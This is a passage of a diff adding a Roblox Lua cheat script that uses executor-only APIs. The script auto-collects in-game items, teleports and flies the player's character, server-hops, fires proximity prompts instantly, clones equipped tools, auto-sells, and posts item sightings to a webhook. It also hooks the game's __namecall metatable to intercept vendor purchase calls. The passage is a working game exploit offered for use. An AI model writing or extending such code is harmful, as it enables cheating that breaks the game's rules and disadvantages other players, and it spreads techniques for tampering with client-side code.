+                            and getgenv()[enabledKey]
+                            and not getgenv()[stoppedKey]
+                        do
+                            task.wait(2)
+                            waited = waited + 2
+                            local f2 = getBrainrotFolder("Celestial")
+                            if f2 and #f2:GetChildren() > 0 then break end
+                        end
+                        continue
+                    end
+                end
+                -- انتظر حتى 25 ثانية لو البراينروت لسا ما نزلت (round بدأ للتو)
+                local spawnWait = 0
+                while spawnWait < 25
+                    and getgenv()[enabledKey]
+                    and not getgenv()[stoppedKey]
+                do
+                    task.wait(2)
+                    spawnWait = spawnWait + 2
+                    local f2 = getBrainrotFolder(rarity)
+                    if f2 and #f2:GetChildren() > 0 then
+                        folder = f2
+                        break
+                    end
+                end
+                -- تحقق بعد الانتظار
+                folder = getBrainrotFolder(rarity)
+                if folder and #folder:GetChildren() > 0 then
+                    continue  -- يعيد الـ while ليجمع
+                end
+                task.wait(3)
+                task.spawn(function() smartHopGeneric(enabledKey, stoppedKey) end)
+            end
+            return
+        end
+        for _, obj in ipairs(objs) do
+            if not getgenv()[enabledKey] or getgenv()[stoppedKey] then return end
+            if obj and obj.Parent then
+
+                local isTaken = false
+                pcall(function()
+                    local pp = obj:FindFirstChildWhichIsA("ProximityPrompt", true)
+                    if pp and (not pp.Enabled or not pp.ActionEnabled) then
+                        isTaken = true
+                        return
+                    end
+                    local ownerAttr = obj:GetAttribute("Owner")
+                                   or obj:GetAttribute("Carrying")
+                                   or obj:GetAttribute("IsHeld")
+                                   or obj:GetAttribute("HeldBy")
+                                   or obj:GetAttribute("PickedUp")
+                    if ownerAttr and tostring(ownerAttr) ~= "" and tostring(ownerAttr) ~= "0" then
+                        isTaken = true
+                        return
+                    end
+                    local anc = obj.Parent
+                    while anc and anc ~= workspace do
+                        for _, plr in pairs(Players:GetPlayers()) do
+                            if plr.Character == anc then
+                                isTaken = true
+                                return
+                            end
+                        end
+                        anc = anc.Parent
+                    end
+                end)
+                if not isTaken then
+                    pcall(grabBrainrot, obj)
+                    pcall(submitAndPlace)
+                end
+                task.wait(0.3)
+            end
+        end
+        if getgenv()[enabledKey] and not getgenv()[stoppedKey] then
+            pcall(teleportToMyPlot)
+            task.wait(3)
+            task.spawn(function() smartHopGeneric(enabledKey, stoppedKey) end)
+        end
+        return
+    end
+end
+local function runFragHopFarm(enabledKey, stoppedKey)
+    while getgenv()[enabledKey] and not getgenv()[stoppedKey] do
+        local char = player.Character
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+        if not root then task.wait(0.5) continue end
+        local found, seen = {}, {}
+        local _scanCharSet = {}
+        pcall(function()
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr.Character then _scanCharSet[plr.Character] = true end
+            end
+        end)
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            if not (obj and obj.Parent) then continue end
+            local n = obj.Name:lower()
+            if not (n:find("fragment") or n == "frag") then continue end
+            if not (obj:IsA("BasePart") or obj:IsA("Model")) then continue end
+            local oa = obj:GetAttribute("Owner") or obj:GetAttribute("Carrying")
+                   or obj:GetAttribute("IsHeld") or obj:GetAttribute("HeldBy")
+            if oa and tostring(oa) ~= "" and tostring(oa) ~= "0" then continue end
+            local skip = false
+            local anc = obj.Parent
+            while anc and anc ~= workspace do
+                if seen[anc] then skip = true break end
+                if _scanCharSet[anc] then skip = true break end
+                local an = anc.Name
+                if an == "Plots" or an == "Plot" or an == "PlayerPlot"
+                or an == "PlacedItems" or an == "Furniture" or an == "Chair" then
+                    skip = true break
+                end
+                anc = anc.Parent
+            end
+            if not skip then seen[obj] = true table.insert(found, obj) end
+        end
+        task.wait(0.1)
+        if #found == 0 then
+            if getgenv()[enabledKey] and not getgenv()[stoppedKey] then
+                -- انتظر حتى 20 ثانية لو الـ fragments لسا ما نزلت
+                local spawnWait = 0
+                while spawnWait < 20
+                    and getgenv()[enabledKey]
+                    and not getgenv()[stoppedKey]
+                do
+                    task.wait(2)
+                    spawnWait = spawnWait + 2
+                    local tmpFound = {}
+                    pcall(function()
+                        for _, obj in ipairs(workspace:GetDescendants()) do
+                            if not (obj and obj.Parent) then continue end
+                            local n2 = obj.Name:lower()
+                            if not (n2:find("fragment") or n2 == "frag") then continue end
+                            if not (obj:IsA("BasePart") or obj:IsA("Model")) then continue end
+                            table.insert(tmpFound, obj)
+                        end
+                    end)
+                    if #tmpFound > 0 then break end
+                end
+                -- re-scan
+                found = {}
+                pcall(function()
+                    for _, obj in ipairs(workspace:GetDescendants()) do
+                        if not (obj and obj.Parent) then continue end
+                        local n2 = obj.Name:lower()
+                        if not (n2:find("fragment") or n2 == "frag") then continue end
+                        if not (obj:IsA("BasePart") or obj:IsA("Model")) then continue end
+                        table.insert(found, obj)
+                    end
+                end)
+                if #found > 0 then continue end
+                task.wait(3)
+                task.spawn(function() smartHopGeneric(enabledKey, stoppedKey) end)
+            end
+            return
+        end
+        table.sort(found, function(a, b)
+            local function getPos(o)
+                if o:IsA("BasePart") then return o.Position end
+                local ok, cf = pcall(function() return o:GetModelCFrame() end)
+                return ok and cf.Position or Vector3.zero
+            end
+            return (getPos(a) - root.Position).Magnitude < (getPos(b) - root.Position).Magnitude
+        end)
+
+        local _charSet = {}
+        pcall(function()
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr.Character then _charSet[plr.Character] = true end
+            end
+        end)
+        local _attempted = {}
+        local grabbed = 0
+        for _, frag in ipairs(found) do
+            if not getgenv()[enabledKey] or getgenv()[stoppedKey] then return end
+            if frag and frag.Parent and not _attempted[frag] then
+                _attempted[frag] = true
+                local fragTaken = false
+                pcall(function()
+                    local pp = frag:FindFirstChildWhichIsA("ProximityPrompt", true)
+                    if pp and (not pp.Enabled or not pp.ActionEnabled) then
+                        fragTaken = true
+                        return
+                    end
+                    local ownerAttr = frag:GetAttribute("Owner")
+                                   or frag:GetAttribute("Carrying")
+                                   or frag:GetAttribute("IsHeld")
+                                   or frag:GetAttribute("HeldBy")
+                    if ownerAttr and tostring(ownerAttr) ~= "" and tostring(ownerAttr) ~= "0" then
+                        fragTaken = true
+                        return
+                    end
+                    local anc = frag.Parent
+                    while anc and anc ~= workspace do
+                        if _charSet[anc] then fragTaken = true return end
+                        anc = anc.Parent
+                    end
+                end)
+                if fragTaken then continue end
+                local part = (frag:IsA("BasePart") and frag)
+                    or frag.PrimaryPart
+                    or frag:FindFirstChildWhichIsA("BasePart")
+                if not part then continue end
+                root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                if not root then break end
+                safeTeleport(part.CFrame * CFrame.new(0, 4, 0))
+                task.wait(0.15)
+                root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    pcall(function() root.CFrame = CFrame.new(part.Position + Vector3.new(0, 3, 0)) end)
+                    task.wait(0.2)
+                    _firetouchinterest(root, part, 0)
+                    task.wait(0.05)
+                    local allDesc = frag:IsA("Model") and frag:GetDescendants() or { frag }
+                    for _, d in ipairs(allDesc) do
+                        if d:IsA("ProximityPrompt") then
+                            pcall(function() d.HoldDuration = 0 d.MaxActivationDistance = 999 end)
+                            pcall(function() if typeof(fireproximityprompt) == "function" then fireproximityprompt(d) end end)
+                        end
+                    end
+                end
+                grabbed = grabbed + 1
+                task.wait(0.3)
+            end
+        end
+        if grabbed > 0 then
+            pcall(function()
+                local rs = game:GetService("ReplicatedStorage")
+                local remote = rs:FindFirstChild("SubmitFragment")
+                if remote then remote:FireServer() end
+            end)
+            pcall(submitAndPlace)
+            pcall(teleportToMyPlot)
+            if getgenv()[enabledKey] and not getgenv()[stoppedKey] then
+                task.wait(3)
+                task.spawn(function() smartHopGeneric(enabledKey, stoppedKey) end)
+            end
+            return
+        end
+        task.wait(math.random(1, 3))
+        if getgenv()[enabledKey] and not getgenv()[stoppedKey] then
+            task.spawn(function() smartHopGeneric(enabledKey, stoppedKey) end)
+        end
+        return
+    end
+end
+local stopFarmLoop
+local function startFarm(rarities)
+    if S.collectorRunning then stopFarmLoop() task.wait(0.1) end
+    S.collectorRunning = true
+    local raritySet = {}
+    for _, r in ipairs(rarities) do raritySet[r] = true end
+    S.collectorThread = task.spawn(function()
+        local _sortedCache   = {}
+        local _lastScanSeen  = -1
+        while S.collectorRunning do
+            if S.grabLock then task.wait(0.2) continue end
+            if monitorData.lastScan ~= _lastScanSeen then
+                _lastScanSeen = monitorData.lastScan
+                _sortedCache  = {}
+                for _, entry in ipairs(monitorData.brainrots) do
+                    if raritySet[entry.rarity] and entry.obj and entry.obj.Parent then
+                        if passesFarmFilters(entry.obj) then
+                            table.insert(_sortedCache, entry)
+                        end
+                    end
+                end
+                table.sort(_sortedCache, function(a, b)
+                    return (RARITY_ORDER[a.rarity] or 99) < (RARITY_ORDER[b.rarity] or 99)
+                end)
+            end
+            local targets = {}
+            for _, entry in ipairs(_sortedCache) do
+                if entry.obj and entry.obj.Parent then
+                    table.insert(targets, entry)
+                end
+            end
+            if #targets == 0 then task.wait(1) continue end
+            local grabbed = 0
+            for _, entry in ipairs(targets) do
+                if not S.collectorRunning then break end
+                if S.grabLock then break end
+                if grabbed >= S.maxCarry then break end
+                if entry.obj and entry.obj.Parent then
+                    local ok, did = pcall(grabBrainrot, entry.obj)
+                    if ok and did then
+                        grabbed = grabbed + 1
+                        if grabbed < S.maxCarry then
+                            task.wait(0.3)
+                        end
+                    end
+                end
+            end
+            if grabbed > 0 and S.collectorRunning then
+                pcall(submitAndPlace)
+            end
+            task.wait(0.2)
+        end
+    end)
+end
+stopFarmLoop = function()
+    S.collectorRunning = false
+    if S.collectorThread then pcall(task.cancel, S.collectorThread) S.collectorThread = nil end
+end
+local function scanWorld()
+    local found       = {}
+    local mutationMap = {}
+    for _, rarity in ipairs(ALL_RARITIES) do
+        local folder = getBrainrotFolder(rarity)
+        if folder then
+            for _, obj in ipairs(folder:GetChildren()) do
+                if obj and obj.Parent then
+                    local mutation    = obj:GetAttribute("Mutation") or "Normal"
+                    local displayName = obj:GetAttribute("DisplayName") or obj.Name
+                    local entry = { rarity = rarity, name = displayName, mutation = mutation, obj = obj }
+                    table.insert(found, entry)
+                    if mutation ~= "Normal" then
+                        table.insert(mutationMap, entry)
+                    end
+                end
+            end
+        end
+    end
+    monitorData.brainrots  = found
+    monitorData.mutations  = mutationMap
+    monitorData.totalCount = #found
+    monitorData.lastScan   = tick()
+    for obj in pairs(S.traitData) do
+        if not obj or not obj.Parent then S.traitData[obj] = nil end
+    end
+end
+local _webhookSeenBrainrots = {}
+local function startMonitor()
+    if monitorData.isRunning then return end
+    monitorData.isRunning = true
+    local _dirty = true
+    local _dirtyConns = {}
+    local function _markDirty() _dirty = true end
+    local function _watchFolder(folder)
+        if not folder then return end
+        table.insert(_dirtyConns, folder.ChildAdded:Connect(_markDirty))
+        table.insert(_dirtyConns, folder.ChildRemoved:Connect(_markDirty))
+    end
+    task.spawn(function()
+        local gf = getGF()
+        local br = gf and gf:FindFirstChild("Brainrots")
+        if br then
+            for _, rarity in ipairs(ALL_RARITIES) do
+                _watchFolder(br:FindFirstChild(rarity))
+            end
+        end
+        local wbr = workspace:FindFirstChild("Brainrots")
+        if wbr then _watchFolder(wbr:FindFirstChild("Godly")) end
+    end)
+    S.monitorThread = task.spawn(function()
+        while monitorData.isRunning do
+            if _dirty then
+                _dirty = false
+                pcall(scanWorld)
+                pcall(function()
+                    for _, entry in ipairs(monitorData.brainrots) do
+                        if entry.rarity == "Celestial" or entry.rarity == "Godly" then
+                            local key = entry.name .. "_" .. entry.rarity .. "_" .. (entry.mutation or "Normal")
+                            if not _webhookSeenBrainrots[key] then
+                                _webhookSeenBrainrots[key] = true
+                                local mut   = entry.mutation or "Normal"
+                                local emoji = entry.rarity == "Godly" and "👑" or "🌌"
+                                local col   = entry.rarity == "Godly" and 0xFFD700 or 0x9B59B6
+                                local title = emoji .. " " .. entry.rarity .. " Spotted! " .. emoji
+                                local desc  = "**" .. entry.name .. "**\nMutation: `" .. mut .. "`\nServer: `" .. tostring(game.JobId):sub(1,8) .. "...`"
+                                local wkey  = title .. "|" .. desc
+                                _webhookSent[wkey] = nil
+                                sendWebhook(title, desc, col)
+                            end
+                        end
+                    end
+                    local alive = {}
+                    for _, entry in ipairs(monitorData.brainrots) do
+                        alive[entry.name .. "_" .. entry.rarity .. "_" .. (entry.mutation or "Normal")] = true
+                    end
+                    for k in pairs(_webhookSeenBrainrots) do
+                        if not alive[k] then _webhookSeenBrainrots[k] = nil end
+                    end
+                end)
+            end
+            task.wait(1)
+        end
+        for _, c in ipairs(_dirtyConns) do pcall(function() c:Disconnect() end) end
+    end)
+end
+local traitHookConn = nil
+local function initTraitHook()
+    local ok, traitEvent = pcall(function()
+        return ReplicatedStorage.Registries.TraitsRegistry.SetupTraitVFX
+    end)
+    if not ok or not traitEvent then return end
+    if traitHookConn then traitHookConn:Disconnect() end
+    traitHookConn = traitEvent.OnClientEvent:Connect(function(brainrotModel, vfxModule)
+        if not brainrotModel or not brainrotModel.Parent then return end
+        local traitName = ""
+        pcall(function() traitName = vfxModule.Name:gsub("VFX$", "") end)
+        if traitName == "" then return end
+        if not S.traitData[brainrotModel] then
+            S.traitData[brainrotModel] = {
+                obj        = brainrotModel,
+                traitNames = {},
+                name       = brainrotModel:GetAttribute("DisplayName") or brainrotModel.Name,
+                rarity     = (brainrotModel.Parent and brainrotModel.Parent.Name) or "Unknown",
+                mutation   = brainrotModel:GetAttribute("Mutation") or "Normal",
+            }
+        end
+        local already = false
+        for _, t in ipairs(S.traitData[brainrotModel].traitNames) do
+            if t == traitName then already = true break end
+        end
+        if not already then
+            table.insert(S.traitData[brainrotModel].traitNames, traitName)
+        end
+    end)
+end
+local allStates = {
+    Enum.HumanoidStateType.Climbing,     Enum.HumanoidStateType.FallingDown,
+    Enum.HumanoidStateType.Flying,       Enum.HumanoidStateType.Freefall,
+    Enum.HumanoidStateType.GettingUp,
+    Enum.HumanoidStateType.Landed,       Enum.HumanoidStateType.Physics,
+    Enum.HumanoidStateType.PlatformStanding, Enum.HumanoidStateType.Ragdoll,
+    Enum.HumanoidStateType.Running,      Enum.HumanoidStateType.RunningNoPhysics,
+    Enum.HumanoidStateType.Seated,       Enum.HumanoidStateType.StrafingNoPhysics,
+    Enum.HumanoidStateType.Swimming,
+}
+local function setHumanoidStates(enabled)
+    local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    for _, state in ipairs(allStates) do hum:SetStateEnabled(state, enabled) end
+    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+    if enabled then
+        hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
+    else
+        hum:ChangeState(Enum.HumanoidStateType.Swimming)
+    end
+end
+local startFlySystem, stopFlySystem
+local flyInputConnections = {}
+startFlySystem = function()
+    local chr = player.Character
+    if not chr then return end
+    S.nowe      = true
+    S.tpwalking = false
+    S.tpwalking = true
+    task.spawn(function()
+        local c = player.Character
+        local h = c and c:FindFirstChildWhichIsA("Humanoid")
+        while S.tpwalking and RunService.Heartbeat:Wait() and c and h and h.Parent do
+            if h.MoveDirection.Magnitude > 0 then c:TranslateBy(h.MoveDirection * S.speeds) end
+        end
+    end)
+    pcall(function()
+        chr.Animate.Disabled = true
+        local hum2 = chr:FindFirstChildOfClass("Humanoid") or chr:FindFirstChildOfClass("AnimationController")
+        if hum2 then
+            for _, track in next, hum2:GetPlayingAnimationTracks() do track:AdjustSpeed(0) end
+        end
+    end)
+    setHumanoidStates(false)
+    local hum     = chr:FindFirstChildOfClass("Humanoid")
+    local rigType = hum and hum.RigType
+    local torso   = (rigType == Enum.HumanoidRigType.R6)
+                    and chr:FindFirstChild("Torso")
+                    or  chr:FindFirstChild("UpperTorso")
+    if not torso then return end
+    local bg = Instance.new("BodyGyro", torso)
+    bg.P           = 9e4
+    bg.maxTorque   = Vector3.new(9e9, 9e9, 9e9)
+    bg.cframe      = torso.CFrame
+    local bv = Instance.new("BodyVelocity", torso)
+    bv.velocity  = Vector3.new(0, 0.1, 0)
+    bv.maxForce  = Vector3.new(9e9, 9e9, 9e9)
+    hum.PlatformStand = true
+    local ctrl     = {f=0, b=0, l=0, r=0}
+    local lastctrl = {f=0, b=0, l=0, r=0}
+    local maxspeed = 50
+    local spd      = 0
+    task.spawn(function()
+        while S.nowe do
+            if rigType == Enum.HumanoidRigType.R6 then
+                RunService.RenderStepped:Wait()
+            else
+                RunService.Heartbeat:Wait()
+            end
+            if ctrl.l+ctrl.r ~= 0 or ctrl.f+ctrl.b ~= 0 then
+                spd = math.min(spd + 0.5 + (spd/maxspeed), maxspeed)
+            elseif spd ~= 0 then
+                spd = math.max(spd - 1, 0)
+            end
+            local cam = workspace.CurrentCamera.CoordinateFrame
+            if (ctrl.l+ctrl.r) ~= 0 or (ctrl.f+ctrl.b) ~= 0 then
+                bv.velocity = ((cam.lookVector*(ctrl.f+ctrl.b)) + ((cam*CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - cam.p)) * spd
+                lastctrl = {f=ctrl.f, b=ctrl.b, l=ctrl.l, r=ctrl.r}
+            elseif spd ~= 0 then
+                bv.velocity = ((cam.lookVector*(lastctrl.f+lastctrl.b)) + ((cam*CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - cam.p)) * spd
+            else
+                bv.velocity = Vector3.new(0, 0, 0)
+            end
+            bg.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*spd/maxspeed), 0, 0)
+        end
+        bg:Destroy()
+        bv:Destroy()
+        pcall(function()
+            hum.PlatformStand    = false
+            chr.Animate.Disabled = false
+        end)
+        S.tpwalking = false
+    end)
+    task.spawn(function()
+        while S.nowe do
+            RunService.Heartbeat:Wait()
+            local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                if S.upHeld   then root.CFrame = root.CFrame * CFrame.new(0,  1, 0) end
+                if S.downHeld then root.CFrame = root.CFrame * CFrame.new(0, -1, 0) end
+            end
+        end
+    end)
+    table.insert(flyInputConnections, UserInputService.InputBegan:Connect(function(input, gpe)
+        if gpe then return end
+        if input.KeyCode == Enum.KeyCode.W then ctrl.f =  1 end
+        if input.KeyCode == Enum.KeyCode.S then ctrl.b = -1 end
+        if input.KeyCode == Enum.KeyCode.A then ctrl.l = -1 end
+        if input.KeyCode == Enum.KeyCode.D then ctrl.r =  1 end
+    end))
+    table.insert(flyInputConnections, UserInputService.InputEnded:Connect(function(input)
+        if input.KeyCode == Enum.KeyCode.W then ctrl.f = 0 end
+        if input.KeyCode == Enum.KeyCode.S then ctrl.b = 0 end
+        if input.KeyCode == Enum.KeyCode.A then ctrl.l = 0 end
+        if input.KeyCode == Enum.KeyCode.D then ctrl.r = 0 end
+    end))
+end
+stopFlySystem = function()
+    S.nowe      = false
+    S.tpwalking = false
+    for _, c in ipairs(flyInputConnections) do c:Disconnect() end
+    flyInputConnections = {}
+    setHumanoidStates(true)
+    pcall(function()
+        if player.Character then player.Character.Animate.Disabled = false end
+    end)
+end
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+    if input.KeyCode == Enum.KeyCode.Q then S.upHeld   = true  end
+    if input.KeyCode == Enum.KeyCode.E then S.downHeld = true  end
+    if input.KeyCode == Enum.KeyCode.RightShift then
+        if getgenv().OxyoAutoHopCoin or getgenv().OxyoAutoHopGodly or getgenv().OxyoAutoHopCel or getgenv().OxyoAutoHopFrag or getgenv().OxyoAutoHopAqua then
+            nuclearStop()
+        end
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.Q then S.upHeld   = false end
+    if input.KeyCode == Enum.KeyCode.E then S.downHeld = false end
+end)
+local function duplicateEquipped()
+    local char = player.Character
+    if not char then return false, "No character found." end
+    local tool = nil
+    for _, obj in ipairs(char:GetChildren()) do
+        if obj:IsA("Tool") then tool = obj break end
+    end
+    if not tool then return false, "No Brainrot equipped." end
+    local backpack = player:FindFirstChild("Backpack")
+    if not backpack then return false, "No backpack found." end
+    local clone = tool:Clone()
+    clone.Parent = backpack
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then hum:UnequipTools() end
+    return true, "Duplicated: " .. tool.Name
+end
+local function getPlotBrainrotCount()
+    local count = 0
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _, v in pairs(backpack:GetChildren()) do
+            if v:IsA("Tool") then count = count + 1 end
+        end
+    end
+    local char = player.Character
+    if char then
+        for _, v in pairs(char:GetChildren()) do
+            if v:IsA("Tool") then count = count + 1 end
+        end
+    end
+    return count
+end
+local function getSellRemote()
+    local events = ReplicatedStorage:FindFirstChild("Events")
+    if not events then return nil end
+    local r = events:FindFirstChild("SellDialogue")
+    if r then return r end
+    for _, v in pairs(events:GetChildren()) do
+        if v.Name:lower():find("sell") then return v end
+    end
+    return nil
+end
+local function doSell()
+    local remote = getSellRemote()
+    if not remote then
+        warn("[AutoSell] Remote not found in ReplicatedStorage.Events!")
+        return false
+    end
+    local ok, err = pcall(function()
+        if remote:IsA("RemoteFunction") then
+            remote:InvokeServer("SellAll")
+        elseif remote:IsA("RemoteEvent") then
+            remote:FireServer("SellAll")
+        end
+    end)
+    if not ok then warn("[AutoSell] Fire failed:", tostring(err)) end
+    return ok
+end
+local function attachPlotCounter(plot)
+    if S.countConn then S.countConn:Disconnect() end
+    playerPlot     = plot
+    S.collectedCount = 0
+    local br = plot:FindFirstChild("Brainrots")
+    if not br then return end
+    S.countConn = br.ChildAdded:Connect(function(child)
+        if child:IsA("Model") then
+            S.collectedCount = S.collectedCount + 1
+        end
+    end)
+end
+local function isValidPos(pos)
+    return math.abs(pos.X) < 5000 and math.abs(pos.Y) < 5000 and math.abs(pos.Z) < 5000
+end
+local function getLuckyBlocks()
+    local gf = workspace:FindFirstChild("GameFolder")
+    local lb = gf and gf:FindFirstChild("LuckyBlocks")
+    if not lb then return {} end
+    local result = {}
+    for _, block in ipairs(lb:GetChildren()) do
+        local pp     = block:FindFirstChildWhichIsA("ProximityPrompt", true)
+        local active = false
+        local pos    = Vector3.new(0, 0, 0)
+        if pp then
+            pos    = pp.Parent.Position
+            active = isValidPos(pos)
+        end
+        table.insert(result, { name = block.Name, active = active, pos = pos, block = block, pp = pp })
+    end
+    return result
+end
+local function shouldFireLucky(blockName)
+    if auto.luckyType == "All" then return true end
+    local bn = blockName:lower()
+    local lt = auto.luckyType:lower()
+    return bn == lt or bn:find(lt, 1, true) ~= nil or lt:find(bn, 1, true) ~= nil
+end
+local function luckyTraitPass(block)
+    if not auto.luckyTraits or #auto.luckyTraits == 0 then return true end
+    local td = S.traitData[block]
+    if not td or #td.traitNames == 0 then return false end
+    for _, want in ipairs(auto.luckyTraits) do
+        for _, have in ipairs(td.traitNames) do
+            if have == want then return true end
+        end
+    end
+    return false
+end
+local function tryFireBlock(block)
+    if not auto.luckyEnabled then return end
+    if not shouldFireLucky(block.Name) then return end
+    if not luckyTraitPass(block) then return end
+    pcall(function()
+        local pp = block:FindFirstChildWhichIsA("ProximityPrompt", true)
+        if not pp then return end
+        local pos = pp.Parent.Position
+        if not isValidPos(pos) then return end
+        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        root.CFrame = CFrame.new(pos + Vector3.new(0, 3, 3))
+        task.wait(0.3)
+        _fireprox(pp)
+        task.wait(0.5)
+        root.CFrame = getSafeBase()
+    end)
+end
+local BUY_RESULT = {
+    SUCCESS      = "success",
+    OUT_OF_STOCK = "out_of_stock",
+    NO_COINS     = "no_coins",
+    NOT_IN_SHOP  = "not_in_shop",
+}
+local _VP_REMOTE  = ReplicatedStorage:WaitForChild("Events", 10)
+                and ReplicatedStorage.Events:WaitForChild("VendorPurchase", 10)
+local function _getGearsAccess()
+    local vendor = workspace:FindFirstChild("GameFolder")
+        and workspace.GameFolder:FindFirstChild("Shops")
+        and workspace.GameFolder.Shops:FindFirstChild("Vendor")
+    return vendor and vendor:FindFirstChild("GearsAccess")
+end
+local _stockData = {}
+local _lastRestockTick = 0
+local function _normaliseKey(s)
+    return tostring(s):lower():gsub("%s+",""):gsub("%d+$","")
+end
+local function _writeStock(rawName, inStock, stock, isManual)
+    local key  = tostring(rawName):lower()
+    local norm = _normaliseKey(rawName)
+    _stockData[key] = { inStock=inStock, stock=stock or 0, manual=isManual or false, t=tick() }
+    if inStock then
+        local toErase = {}
+        for k2, v2 in pairs(_stockData) do
+            if k2 ~= key and not v2.inStock then
+                if _normaliseKey(k2) == norm then
+                    table.insert(toErase, k2)
+                end
+            end
+        end
+        for _, k in ipairs(toErase) do _stockData[k] = nil end
+    end
+end
+local function _hookStockService()
+    local ok, re = pcall(function()
+        return ReplicatedStorage:WaitForChild("Remotes", 5)
+            and ReplicatedStorage.Remotes:WaitForChild("StockGameService", 5)
+            and ReplicatedStorage.Remotes.StockGameService:WaitForChild("ReplicateStockData", 5)
+    end)
+    if not ok or not re then return end
+    re.OnClientEvent:Connect(function(data)
+        if type(data) ~= "table" then return end
+        local function parseEntry(k, v)
+            if type(v) == "table" then
+                for name, info in pairs(v) do
+                    if type(info) == "table" then
+                        local inStock = info.inStock ~= false and (tonumber(info.stock) or 0) > 0
+                        _writeStock(name, inStock, tonumber(info.stock) or 0)
+                    elseif type(info) == "boolean" or type(info) == "number" then
+                        local inStock = info == true or (type(info) == "number" and info > 0)
+                        local stock   = type(info) == "number" and info or (info and 1 or 0)
+                        _writeStock(name, inStock, stock)
+                    end
+                end
+            elseif type(v) == "boolean" or type(v) == "number" then
+                local inStock = v == true or (type(v) == "number" and v > 0)
+                local stock   = type(v) == "number" and v or (v and 1 or 0)
+                _writeStock(k, inStock, stock)
+            end
+        end
+        for k, v in pairs(data) do parseEntry(k, v) end
+    end)
+end
+task.spawn(_hookStockService)
+local _cachedVendorLbl = nil
+local function _getVendorTimerSeconds()
+    if _cachedVendorLbl and _cachedVendorLbl.Parent then
+        local raw = _cachedVendorLbl.Text:gsub("<[^>]+>", "")
+        local h, m, s = raw:match("(%d+):(%d+):(%d+)")
+        if h then return tonumber(h)*3600 + tonumber(m)*60 + tonumber(s) end
+        local m2, s2 = raw:match("(%d+):(%d+)")
+        if m2 then return tonumber(m2)*60 + tonumber(s2) end
+        return nil
+    end
+    local pg = Players.LocalPlayer:FindFirstChild("PlayerGui")
+    if not pg then return nil end
+    local function find(inst, depth)
+        if depth > 5 then return nil end
+        if inst.Name == "Vendor" and inst:IsA("Frame") then
+            local main = inst:FindFirstChild("Main")
+            local lbl  = main and main:FindFirstChild("Timer")
+            if lbl and lbl:IsA("TextLabel") then
+                _cachedVendorLbl = lbl
+                local raw = lbl.Text:gsub("<[^>]+>", "")
+                local h, m, s = raw:match("(%d+):(%d+):(%d+)")
+                if h then return tonumber(h)*3600 + tonumber(m)*60 + tonumber(s) end
+                local m2, s2 = raw:match("(%d+):(%d+)")
+                if m2 then return tonumber(m2)*60 + tonumber(s2) end
+            end
+        end
+        for _, c in ipairs(inst:GetChildren()) do
+            local r = find(c, depth+1)
+            if r then return r end
+        end
+    end
+    for _, gui in ipairs(pg:GetChildren()) do
+        local r = find(gui, 0)
+        if r then return r end
+    end
+    return nil
+end
+task.spawn(function()
+    local prevSeconds = nil
+    while true do
+        task.wait(10)
+        local secs = _getVendorTimerSeconds()
+        if secs then
+            if prevSeconds and prevSeconds < 90 and secs > 1200 then
+                _lastRestockTick = tick()
+                local toErase = {}
+                for k, v in pairs(_stockData) do
+                    if v.manual and not v.inStock then
+                        table.insert(toErase, k)
+                    end
+                end
+                for _, k in ipairs(toErase) do _stockData[k] = nil end
+                pcall(function()
+                    Rayfield:Notify({
+                        Title   = "🔄 Shop Restocked!",
+                        Content = "Auto Buy resumed — stock flags cleared.",
+                        Duration = 4,
+                        Image   = 4483362458,
+                    })
+                end)
+            end
+            prevSeconds = secs
+        end
+    end
+end)
+local _resolvedKeys = {}
+local function _hookVendorCapture()
+    if not _hasAdvancedAPI or not _VP_REMOTE then return end
+    pcall(function()
+        local mt  = getrawmetatable(game)
+        local old = rawget(mt, "__namecall")
+        if not old then return end
+        setreadonly(mt, false)
+        local _orig = mt.__namecall
+        mt.__namecall = newcclosure(function(self, ...)
+            local m = getnamecallmethod()
+            if m == "FireServer" and self == _VP_REMOTE then
+                local args = {...}
+                if args[1] ~= nil then
+                    local key = tostring(args[1])
+                    _resolvedKeys[key:lower()] = key
+                end
+            end
+            return _orig(self, ...)
+        end)
+        setreadonly(mt, true)
+    end)
+end
+task.spawn(_hookVendorCapture)
+local function parseCash(str)
+    if type(str) == "number" then return str end
+    str = tostring(str):gsub(",", ""):gsub("%s", "")
+    local suffixes = {
+        K=1e3, M=1e6, B=1e9, T=1e12,
+        Qd=1e15, Qn=1e18, Sx=1e21, Sp=1e24,
+        Oc=1e27, No=1e30, Dc=1e33,
+    }
+    local sorted = {}
+    for s in pairs(suffixes) do table.insert(sorted, s) end
+    table.sort(sorted, function(a,b) return #a > #b end)
+    for _, s in ipairs(sorted) do
+        local num = str:match("^(%-?%d+%.?%d*)" .. s .. "$")
+        if num then return (tonumber(num) or 0) * suffixes[s] end
+    end
+    return tonumber(str) or 0
+end
+local function getCoins()
+    local ls = player:FindFirstChild("leaderstats")
+    if not ls then return math.huge end
+    local coins = ls:FindFirstChild("Coins") or ls:FindFirstChild("Coin") or ls:FindFirstChild("Cash")
+    if not coins then return math.huge end
+    return parseCash(coins.Value)
+end
+local function _resolveServerKey(data)
+    local dn     = data.displayName:lower()
+    local normDN = _normaliseKey(data.displayName)
+    if _resolvedKeys[dn] then return _resolvedKeys[dn] end
+    for k, v in pairs(_resolvedKeys) do
+        local normK = _normaliseKey(k)
+        if normK == normDN or normK:find(normDN,1,true) or normDN:find(normK,1,true) then
+            return v
